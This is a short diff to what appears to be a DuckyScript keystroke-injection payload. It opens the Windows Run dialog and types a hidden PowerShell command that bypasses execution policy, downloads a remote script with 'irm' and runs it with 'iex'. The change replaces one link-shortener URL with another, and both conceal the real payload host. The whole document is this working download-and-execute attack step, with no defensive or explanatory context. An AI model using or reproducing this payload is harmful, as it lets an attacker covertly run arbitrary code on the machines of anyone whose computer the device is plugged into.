@@ -12,5 +12,5 @@ REM     ------------------------------------------------------------------------
 
 GUI r
 DELAY 500
-STRING powershell -w h -NoP -NonI -Ep Bypass irm https://grabify.link/6RNHSQ | iex
+STRING powershell -w h -NoP -NonI -Ep Bypass irm https://bit.ly/3HcUAwJ | iex
 ENTER
